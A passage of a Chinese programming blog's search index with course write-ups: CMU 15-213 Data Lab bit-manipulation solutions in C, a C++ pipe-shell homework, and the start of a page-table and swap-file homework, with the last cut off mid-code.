= 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { /** * tear the number into 4 parts, get rid of the other digits except 0xaa * if the results are all the same, then compare it with 0xaa, if there are the same, xor returns 0 * otherwise not all odd bits in word set is set to 1 */ int first = (x \u003e\u003e 24) \u0026 0xaa; int second = (x \u003e\u003e 16) \u0026 0xaa; int third = (x \u003e\u003e 8) \u0026 0xaa; int fourth = x \u0026 0xaa; return !((first \u0026 second \u0026 third \u0026 fourth) ^ 0xaa); } 对于单个字节的奇数位，我们可以使用0xaa作为 mask。 本题目中我将位打成 4 个部分，每个部分与 mask 相与。如果每个奇数位都是 1 的话，四个部分的比较结果应该相同，都等于0xaa，该值与0xaa异或得到0x0，取!后得到0x1。否则该值不为0xaa，同0xaa亦或得到其他非零值，取!后得到0x0。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:4:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#alloddbits"},{"categories":["系统入门"],"content":" 5 negate c /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 5 * Rating: 2 */ int negate(int x) { return (~x + 1); } 该题目中我们需要求解某个数的相反数。在课堂中我们学过，一个数和它相反数的和为 0。那么如何获得其相反数呢？以x为例，我们知道x + ~x = ~0，也就是全 f，然后~0 + 1 = 0。因此，-x的补码表示即为~x + 1。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:5:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#negate"},{"categories":["系统入门"],"content":" 6 isAsciiDigit c /* * isAsciiDigit - return 1 if 0x30 \u003c= x \u003c= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { /** * least = (x \u0026 0xf) - 0xa * if least \u003e 0 (with 0 in most significant bit) then least = 0 * else least = 1 */ int least = ((((x \u0026 0xf) + (~0xa + 1)) \u003e\u003e 31) \u0026 0x1); int second = !((x \u003e\u003e 4) ^ 0x3); return least \u0026 second; } 这里我使用的方法是将该数拆分为最低位和其他位来比较。我们将最低位与0xa相减，如果求得的结果为负数，符号位即为 1，代表该值在 0-9 之间。接下来判断其他位是否为0x3，如果是，则和0x3异或结果为 0，通过逻辑!返回 1。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:6:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#isasciidigit"},{"categories":["系统入门"],"content":" 7 conditional c /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { /** * judge if x != 0, if true, !!x = 1, return y, otherwise !!x = 0, return z */ // cond gets all f when !!x == 1 int cond = ((!!x) \u003c\u003c 31) \u003e\u003e 31; return (cond \u0026 y) | (~cond \u0026 z); } 这里我们先获取x的值，如果x != 0，则!!x = 0x1，否则为0x0。扩展该值，当该值为0x1时与y相与得到 y。当该值为0x0，取反后与 z 相与得到 z。因为这两个值只取其一，当一边不为 0 时另一边必然为 0，因此两边用|连接。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:7:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#conditional"},{"categories":["系统入门"],"content":" 8 isLessOrEqual 本题要求使用最多 24 个运算符，但是这里我使用的过多了，应该会有更好的办法。期待有人指正。 c /* * isLessOrEqual - if x \u003c= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { // first compare their sign bit int sign_x = (x \u003e\u003e 31) \u0026 0x1; int sign_y = (y \u003e\u003e 31) \u0026 0x1; // return true if sign = 1(\u003e0) int sign_diff = sign_x + (~sign_y + 1); int sign_bit = (sign_diff \u003e\u003e 31) \u0026 0x1; // then compare the magnitude int mask = (~0) + (0x1 \u003c\u003c 31); int mag_x = x \u0026 mask; int mag_y = y \u0026 mask; int mag_diff = mag_x + (~mag_y + 1); int mag_sign = !(mag_x ^ mag_y) | ((mag_diff \u003e\u003e 31) \u0026 0x1); /** * 2 conditions return true: * 1. sign of x = 1 and sign of y = 0 * 2. sign of x and y equals, and magnitude of x \u003c= y */ return (((!sign_bit) \u0026 sign_diff) | ((!sign_diff) \u0026 mag_sign)); } 这里要分几种情况： x 为负数，y 为正数，直接返回0x1 x 和 y 同符号，比较数值部分。x \u003c= y 时，返回0x1；x \u003e y 时，返回0x0 x 为正数，y 为负数，返回0x0 其中sign_diff为两数符号位之差，此处分三种情况： x 为负数，符号位为 1；y 为正数，符号位为 0。那么两者符号位相减等于0x1，该值的符号位为 0。（这是我们要返回0x1的结果） x 为正数，符号位为 0；y 为负数，符号位为 1。那么两者符号位相减等于0xffffffff(-1)，该值的符号位为 1。（我们不要这个结果） x 和 y 的符号位相同，两者相减为0x0，该值的符号位为 0。（这里我们要看情况，看x是否和y相等） 代码中sign_diff为两符号位之差，sign_bit为该做差结果的最高位。当 x 和 y 的符号位不相同时，当sign_diff为0x1且sign_bit为0x0是，我们返回0x1。这也是运算结果|左半边的由来。 代码中mag_diff为两者数值部分之差，mag_sign为该差值的符号位。当x \u003c y时，mag_diff为0xffffffff。当x == y时，!(mag_x ^ mag_y)为0x1。因此mag_sign = !(mag_x ^ mag_y) | ((mag_diff \u003e\u003e 31) \u0026 0x1)。在判断数值之差部分时，我们需要保证两数符号位之差为0x0，而不是其他（如 x 正 y 负）。因此运算结果右半边的值为(!sign_diff) \u0026 mag_sign。 综上，最后的结果是((!sign_bit) \u0026 sign_diff) | ((!sign_diff) \u0026 mag_sign)。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#islessorequal"},{"categories":["系统入门"],"content":" 9 logicalNeg c /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { /** * if x == 0, x ^ 0x0 = 0 */ return ((x | (x + ~0 + (~(1 \u003c\u003c 31) + 1))) \u003e\u003e 31) + 1; } 这道题的难点在于： 将 0 映射到 0x1 将非 0 值映射到 0x0 在一开始实现时，我的思路是对于 0，可以和0x0异或，判断为 0。但是对于非 0 的数，和0x0异或后还是他自己，我们也不知道 1 落在其中哪个位上，一个个位去找也不现实。那么就需要思考其他的办法。从0x0这个数和其他数的特点下手。这里我参考了这篇博客。 其给出的思路是： -x 为 x 按位取反再+1。 如果一个数为全 0，和相反数相|后结果全部是 0，加 1 后得到0x1 否则结果最高位必然含有 1。向右移动 31 位获得~0，再加 1 得到0x0 问题可改为，如何判断一个数全为 0 。注意到，-x 相当于按位取反再加一，如果 x 为 非 0 数，那么 x|(-x) 后必定为 -1 。利用这个性质，即可判断是否为 0 。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#logicalneg"},{"categories":["系统入门"],"content":" 10 howManyBits c /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { /** * divide and conquer * for positive number, the number of bits = the last position of 1 + 1 * for negative number, the number of bits = the last position of 1 * inverse negative number and deal with it as the same as positive number * 1. judge the sign bit of x, if x is negative, inverse it * 2. judge the high 16 bits, if true(high 16 bits != 0x0), result + 16 * 3. judge the high 8 bits, if true, result + 8 * 4. judge the high 4 bits, if true, result + 4 * 5. judge the high 2 bits, if true, result + 2 * 6. judge the high 1 bits, if true, result + 1 * 7. judge the last 1 bit, if true, result + !!x * 8. the final sum must + 1 * 9. return the result */ // neg x if it's negative int sign = ((x \u0026 (1 \u003c\u003c 31)) \u003e\u003e 31); x = (sign \u0026 ~x) | (~sign \u0026 x); int b16, b8, b4, b2, b1, b0; // int mask_16 = (1 \u003c\u003c 15) \u003e\u003e 15; b16 = !!(x \u003e\u003e 16) \u003c\u003c 4; x = x \u003e\u003e b16; // int mask_8 = 0xff; b8 = !!(x \u003e\u003e 8) \u003c\u003c 3; x = x \u003e\u003e b8; // int mask_4 = 0xf; b4 = !!(x \u003e\u003e 4) \u003c\u003c 2; x = x \u003e\u003e b4; // int mask_2 = 0x3; b2 = !!(x \u003e\u003e 2) \u003c\u003c 1; x = x \u003e\u003e b2; // int mask_1 = 0x1; b1 = !!(x \u003e\u003e 1); x = x \u003e\u003e b1; //! judge if the last bit == 1 b0 = !!x; return b16 + b8 + b4 + b2 + b1 + b0 + 1; } 在这个题目中，我们主要采用分而治之的方法。分治方法的几道例题可以参考 CMU 15-213 课程的Recitation Slides。 首先，我们可以看到，如果该数是一个正数，则其最高位必然是 0，该数的位数 = 最高一个 1 的位置 + 1； 如果该数是一个负数，该数的位数 = 最高一个 1 的位置。 我们不想那么麻烦，把正负数分开讨论，因此我们把负数翻转过来。 在这道题中我们采用的方法是： 判断高 16 位是否有 1（把数向右移动 16 位后，结果不为 0，!!(x \u003e\u003e 16)）。b16 = !!(x \u003e\u003e 16) \u003c\u003c 4。如果是的话，把数值向右移动 16 位(x\u003e\u003eb16)。把b16添加到结果中去。这里一个妙用在于如果!!(x \u003e\u003e 16）= 0x1，!!(x \u003e\u003e 16) \u003c\u003c 4可以直接起到获得数字 16 的方法，无需增加其他的运算。 判断高 8 位是否有 1，操作同上 判断高 4 位是否有 1，操作同上 判断高 2 位是否有 1，操作同上 判断高 1 位是否有 1，操作同上 判断该位是否有 1 结果 + 1（位数 = 最高一个 1 的位置 + 1） 最后把所有判断结果加起来（每次判断的结果都是一个累加的位数，加在一起就是最后的总位数） ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#howmanybits"},{"categories":["系统入门"],"content":" 11 浮点数复习在完成浮点数部分的题目之前，我们需要复习一下浮点数的和其表示方法： 单精度浮点数：1 位符号位 + 8 位阶码(exp) + 11 位尾数(frac) 双精度浮点数：1 位符号位 + 11 位阶码(exp) + 52 位尾数(frac) 其中阶码使用移码表示。$bias = 2^{k-1}-1$ 浮点数分为三类： 规格化数：阶码不全为 1 也不全为 0，尾数前有隐含的 1，指数$E=exp - bias$，分布在非规格化数外侧 非规格化数：阶码全为 0，尾数前隐含 0，指数$E=1 - bias$，主要分布在靠近 0 侧 特殊值：阶码全为 1，若尾数全为 0，则为inf，否则为NaN ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:11:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#浮点数复习"},{"categories":["系统入门"],"content":" 12 floatScale2 c // float /* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ unsigned floatScale2(unsigned uf) { // first get the sign, exp and mag bit of the number unsigned sign = (uf \u003e\u003e 31) \u0026 0x1; unsigned e = (uf \u003e\u003e 23) \u0026 ((1 \u003c\u003c 8) - 1); unsigned f = (uf \u0026 ((1 \u003c\u003c 23) - 1)); if (e == 0) { // denormalized number // E = 1 - bias // frac = f //! how to multiply a denormalized number? frac * 2! f = f * 2; } else if (e == 0xff) { // special number // if frac = 0, then value = inf if (f == 0) { // frac = 1 / 0; return uf; } else { // if frac != 0, value = NaN return uf; } } else { // normalized number // E = e - bias // value = 1 + f e += 1; if (e == ~0) { return uf; } } return (sign \u003c\u003c 31) | (e \u003c\u003c 23) | f; } 本题目要求是计算一个 unsigned 形式表示的浮点数 * 2 后的表示。在完成这题之前，我们首先把浮点数的几个部分提取出来，分几个情况讨论： 非规格化数：指数不变，尾数乘 2。问题来了，这到底是为什么？因为当exp全为0时，exp = 0, E = 1 - bias, frac = 0.f。乘以2就相当于把f左移一位，最高位会进到exp的位置去。如果f最高位是0，左移一位不影响exp（全0）。如果f最高位是1，左移一位后该数变为规格化数，exp变为1，E依然等于 1 - bias。实现了非规格化数到规格化数的平滑过渡（非常重要！） 规格化数：首先将指数 + 1，然后判断是否为特殊值，若是则返回uf。 特殊值：e = 0，直接返回uf（根据题目意思） 将符号位，指数和尾数三个部分拼凑起来，直接返回（本题中无需进行任何计算）。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:12:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#floatscale2"},{"categories":["系统入门"],"content":" 13 floatFloat2Int 本题中不允许使用double类型，我擅自用了，这里应该是不严谨的。 c /* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ int floatFloat2Int(unsigned uf) { // first get the sign, exp and mag bit of the number unsigned sign = (uf \u003e\u003e 31) \u0026 0x1; unsigned e = (uf \u003e\u003e 23) \u0026 ((1 \u003c\u003c 8) - 1); float f = (uf \u0026 ((1 \u003c\u003c 23) - 1)) / (1 \u003c\u003c 23); // then get the exact sign, E and value of the number int s = 0; if (sign == 0) s = 1; else s = -1; int E = 0; float frac = 0; int bias = 127; if (e == 0) { // denormalized number // E = 1 - bias E = 1 - bias; // frac = f frac = f; } else if (e == 0xff) { //! COMPARE WITH 0XFF INSTEAD OF ~0 // special number // if frac = 0, then value = inf if (f == 0) { // frac = 1 / 0; return 0x80000000u; } else { // if frac != 0, value = NaN return 0x80000000u; } } else { // normalized number // E = e - bias E = e - bias; // value = 1 + f frac = 1 + f; } if (E \u003c 0) { return 0; } else if (E \u003e 31) { //! REMEMBER THE SITUATION THAT E \u003e 31 return 0x80000000u; } return s * frac * (1 \u003c\u003c E); } 本题需要返回浮点数转化后的 int 类型数值。需要我们对浮点数的结构有所了解，并且其转化为 int 后需要切割掉小数部分，此外，我们还需要判断指数过大的情况（溢出）。 本题中我们采用的步骤是： 提取出浮点数三个部分，计算符号位的值 当e == 0时，为特殊值的情况，E = 1 - bias，frac = f 当e == 0xff时（注意不是~0/0xffffffff,容易写错！），返回0x80000000u 以上两种情况都不是，则该数为规格化数，E = e - bias; frac = 1 + f; 最后，我们需要进行特殊情况的分类讨论： E \u003c 0, 则最后生成的结果（无论规格化还是非规格化）肯定是个小数，打头的是 0 那种，要切割为int类型，小数部分就被切割掉了 E \u003e 31, 超过了指数可以表示的范围（算是溢出了？），返回0x80000000u 正常情况下返回s * frac * (1 \u003c\u003c E) ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:13:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#floatfloat2int"},{"categories":["系统入门"],"content":" 14 floatPower2 c /* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. Also if, while * Max ops: 30 * Rating: 4 */ unsigned floatPower2(int x) { //! REMEMEBER THAT FLOATING POINT ITSELF IS IN THE FORMAT (-1)^S * M * 2.0^E // fit x into E x = x + 127; //! MIND THE SITUATION THAT X IS TOO LARGE OR TOO SMALL if (x \u003e= 0xff) x = 0xff; else if (x \u003c= 0) x = 0; unsigned result = (x \u003c\u003c 23); return result; } 因为浮点数表示法本身就是以 2 为底，所以本实验就相当于如何把 x 转化为那个 8 位的阶码。因为阶码 = 指数 + bias，这里bias = 127，因此这里E = x + 127。然后和上一题一样，我们需要判断一下 x 的范围是否在0xff和0之间。最后将 x 移动到阶码的位置返回(return x \u003c\u003c 23)即可。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:14:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#floatpower2"},{"categories":["系统入门"],"content":" 15 参考实现在完成 data lab 过程中，我参考了部分如下几个博客的实现: CSAPP 实验一：DataLab 详细讲解与满分代码 lab1 CSAPP：datalab CSAPP lab1: datalab 深入理解计算机系统之位操作实验 CSAPP Data Lab 做题记录（下 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:15:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#参考实现"},{"categories":["系统入门"],"content":" 1 要求实现一个只含有基本命令和 Pipe(不含重定向符及其他符号)的 Shell。 ","date":"2024-01-06","objectID":"/cit5950_hw4/:1:0","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#要求"},{"categories":["系统入门"],"content":" 2 指南","date":"2024-01-06","objectID":"/cit5950_hw4/:2:0","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#指南"},{"categories":["系统入门"],"content":" 2.1 相关文件 pipe_shell.cc:在其中实现 shell 程序 sh.cc: 传入一个附带参数的程序，fork()子程序然后execvp()去执行它 stdin_echo.cc: 从stdin中读取，输出读取的内容，直到获取EOF，然后停止 example_tests/: 其中含有示例输入和对应输出 solution_binaries/: 官方答案执行码 ","date":"2024-01-06","objectID":"/cit5950_hw4/:2:1","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#相关文件"},{"categories":["系统入门"],"content":" 2.2 具体要求 程序一次从标准输入读取一行命令 一行命令包括命令本身和连接他们的 Pipe 不停读入直到读入EOF/用户输入exit 在当前命令完成之后才能运行下一条命令 命令可以是绝对路径或者是程序名（用execvp执行） ","date":"2024-01-06","objectID":"/cit5950_hw4/:2:2","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#具体要求"},{"categories":["系统入门"],"content":" 2.3 建议方法 通读该指南和提供的源代码，搞清楚作业是在做什么 执行一下./solution_binaries/pipe_shell，看看结果长什么样 开始实现pipe_shell.cc，从循环提示用户输入开始，并且打印$提示符，直到无输入或者遇到EOF/输入exit 实现fork()，pipe连接和命令的执行(execvp或者直接运行命令路径) ","date":"2024-01-06","objectID":"/cit5950_hw4/:2:3","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#建议方法"},{"categories":["系统入门"],"content":" 2.4 实现提示 可以使用boost库中的split()和trim()方法， 使用execvp(), fork(), pipe(), waitpid()等函数 注意不同情形：无管道，一个管道，多于一个管道 两种方法 使用一个 pipe 数组 每次fork()之前创建一个pipe 每个子进程只需要两个端口，从上一个进程送来的读端口，和给下一个子进程的写端口 子进程用完端口之后关闭端口，否则程序无法正常退出 ","date":"2024-01-06","objectID":"/cit5950_hw4/:2:4","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#实现提示"},{"categories":["系统入门"],"content":" 2.5 测试 普通测试: make \u0026\u0026 ./pipe_shell 内存泄漏测试: valgrind --leak-check=full ./pipe_shell 比较自己的程序和solution_binaries/pipe_shell的结果： bash cat ./tests/simple_input.txt | ./pipe_shell \u0026\u003e my_output.txt diff my_output.txt ./tests/simple_output.txt ","date":"2024-01-06","objectID":"/cit5950_hw4/:2:5","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#测试"},{"categories":["系统入门"],"content":" 2.6 pipe_shell.cc 实现核心：pipe的内存在操作系统内核中。在每次循环前创建一个pipe，然后fork()一个子进程读取上一个pipe的内容，写入当前这个pipe。使用完毕后关闭这个pipe的写端，保留这个pipe的读端口。进而让下一次dup2导入时使用，使用完后可关闭该pipe的读端口。pipe不会像本地变量那样随着循环的进行而消失，只要保存一下读/写端口，在下一轮循环中就可以正常的进行读写。 此外，我们使用dup2来进行端口的重定向。 cpp #include \u003cunistd.h\u003e // for fork() #include \u003csys/types.h\u003e // for pid_t #include \u003csys/wait.h\u003e // for wait(), waitpid(), etc. #include \u003ccstdlib\u003e // for exit(), EXIT_SUCCESS, and EXIT_FAILURE #include \u003ciostream\u003e #include \u003cvector\u003e #include \u003cstring.h\u003e #include \u003cboost/algorithm/string.hpp\u003e using namespace std; #define BUF_SIZ 1000 int main() { string s; cout \u003c\u003c \"$ \"; while (getline(std::cin, s)) { if (s == \"exit\") { return EXIT_SUCCESS; } int fd[2]; int in_fd = 0; // input fd // split the command into multiple parts vector\u003cstring\u003e tokens; boost::algorithm::split(tokens, s, boost::is_any_of(\"|\"), boost::token_compress_on); int count = 1; int command_num = tokens.size(); for (auto \u0026command : tokens) { // initialize a pipe if (pipe(fd) == -1) { perror(\"pipe creation failed!\"); return EXIT_FAILURE; } // prepare to run the current command // get the current command boost::algorithm::trim(command); // split the command into an array of args vector\u003cstring\u003e args; boost::algorithm::split(args, command, boost::is_any_of(\" \"), boost::token_compress_on); int argc = args.size(); if (argc \u003c 1) { cerr \u003c\u003c \"We need a command!\" \u003c\u003c endl; return EXIT_FAILURE; } // run the current command pid_t child = fork(); if (child == 0) { // setup the file name and input arguments const char *filename = args[0].c_str(); char **argv = new char *[argc + 1]; for (int i = 0; i \u003c argc; i++) { string args_str = args[i]; argv[i] = new char[10]; strcpy(argv[i], args_str.c_str()); } argv[argc] = nullptr; if (in_fd != 0) { // write the pipe value into stdin dup2(in_fd, STDIN_FILENO); close(in_fd); } if (count != command_num) { // write stdout to the pipe dup2(fd[1], STDOUT_FILENO); close(fd[1]); } // use execvp() to run the commmand execvp(filename, argv); // exec didn't work, so an error must have been occurred cerr \u003c\u003c strerror(errno) \u003c\u003c endl; delete[] argv; return EXIT_FAILURE; } // wait for the child process to complete int status; waitpid(child, \u0026status, 0); // close the current pipe write fd close(fd[1]); in_fd = fd[0]; count += 1; } // // read out the pipe // char buffer[BUF_SIZ]; // int count = read(in_fd, buffer, BUF_SIZ); // buffer[count] = '\\0'; // if (count \u003e 0) // { // fprintf(stdout, \"%s\", buffer); // } close(in_fd); cout \u003c\u003c \"$ \"; } return EXIT_SUCCESS; } ","date":"2024-01-06","objectID":"/cit5950_hw4/:2:6","series":["CIT5950"],"tags":null,"title":"HW4: Shell \u0026 Pipe 实现记录","uri":"/cit5950_hw4/#pipe_shellcc"},{"categories":["系统入门"],"content":" 1 Overview本作业要求实现: Page 对象： 若 Page 不在 memory 中，那么它的数据被存储在磁盘上的swap file部分。在swap file中，每一页都有对应的顺序存储的数据。 可以使用 C++ fstream类进行 I/O 读写。尤其是read()和write()方法。 PageTable 对象 包含多个 page 以及swap file 这里主要要求实现 LRU 算法 ","date":"2024-01-04","objectID":"/cit5950_hw3/:1:0","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#overview"},{"categories":["系统入门"],"content":" 2 相关文件","date":"2024-01-04","objectID":"/cit5950_hw3/:2:0","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#相关文件"},{"categories":["系统入门"],"content":" 2.1 Page Page.h Page.cc PageTemplates.cc ","date":"2024-01-04","objectID":"/cit5950_hw3/:2:1","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#page"},{"categories":["系统入门"],"content":" 2.2 PageTable PageTable.h PageTable.cc ","date":"2024-01-04","objectID":"/cit5950_hw3/:2:2","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagetable"},{"categories":["系统入门"],"content":" 2.3 Testing test_page.cc test_pagetable.cc ","date":"2024-01-04","objectID":"/cit5950_hw3/:2:3","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#testing"},{"categories":["系统入门"],"content":" 3 实现提示 map, unordered_map, list, vector 结构都很有用 fstream中的read()和write()很有用 需要将uint8_t切换到char类型来使用fstream 利用初始化列表来初始化引用类型 ","date":"2024-01-04","objectID":"/cit5950_hw3/:3:0","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#实现提示"},{"categories":["系统入门"],"content":" 4 Page实现","date":"2024-01-04","objectID":"/cit5950_hw3/:4:0","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#page实现"},{"categories":["系统入门"],"content":" 4.1 Page 源码分析simplevm namespace中存在一个类Page，此外还有一个uint32_t类型(pno_t类型)的变量，用来表示页号。Page页的解释如下: 页对象存在-\u003e页被导入到 physical memory-\u003e创建一个page，并且从swap_file中读page数据。页的数据从virtual_pno * Page::PAGE_SIZE开始 页对象不存在-\u003e数据存储在swap_file中 用户可以 获取数据 存储数据 将数据刷新到swap file中（多余的无法放入 physical memory 的虚拟内存所存储的地方） Page类中包含如下public方法: Page(fstream\u0026 swap_file, pno_t virtual_pno); 构造函数，传入该page对应的swap_file和页号 我们从swap_file读入页数据，刷新时将页数据写入swap_file 页号规定了我们在swap_file的哪里写入数据 Page(const Page\u0026 other); 利用一个页来复制构造另一个页，两个页具有相同的页号和swap_file地址，但是数据是复制了的（不是引用） ~Page() 清理声明的变量 如果当前数据为 dirty 状态，那么将其刷新到对应的swap_file Page\u0026 operator=(const Page\u0026 rhs) 赋值函数，同复制构造函数，两个Page具有相同的swap_file和页号，但是data是被复制了的 template \u003ctypename T\u003e T access(uint32_t virtual_address); 获取该页面的值（需要考虑错误情况） T store(uint32_t virtual address, const T\u0026 to_write) 存储值到该页面中去 bool operator\u003c(const Page\u0026 rhs); 比较两个页面顺序 pno_t pno(); 获取该页面的页号 bool dirty(); 该 page 是否为 dirty 状态(如果有人在 flush 之后，向该 page 写过值就是 dirty) void flush(); 如果该 page 是 dirty 状态，就把内容刷新到swap_file 变量：static constexpr size_t PAGE_SIZE = 4096U; 该 page 的大小 Page 中还包括如下private变量: fstream\u0026 swap_file_; 注意这里是个引用，一个 page 没有对swap_file的所有权，只能 access 到它，所以这里swap_file是个引用 pno_t virtual_pno_; 该 page 的页号 uint8_t *bytes_; 该 page 的字节内容 bool dirty_; 该 page 是否在 flush 后被写入 ","date":"2024-01-04","objectID":"/cit5950_hw3/:4:1","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#page-源码分析"},{"categories":["系统入门"],"content":" 4.2 Page 设计","date":"2024-01-04","objectID":"/cit5950_hw3/:4:2","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#page-设计"},{"categories":["系统入门"],"content":" 4.3 PageTemplates.cc实现PageTemplates.cc在simplevm namespace中。源码如下: cpp namespace simplevm { // TODO: implement all template member functions for Page // This function allows users to read various data types // from the page. Trying to read a non-primitive type or use // a virtual address that doesn't map to this page results // in undefined behaviour. You can also assume that // anything being read fits in on the page we are reading // is not partially on another page. // If you are familiar with endianness, it shouldn't be // considered for this function. // // Arguments: // - virtual_address: a virtual address that maps somewhere // into the page, where we will read data of type T // // Returns: // - the data of type T that was read from the page template \u003ctypename T\u003e T Page::access(uint32_t virtual_address) { if(virtual_address / PAGE_SIZE != 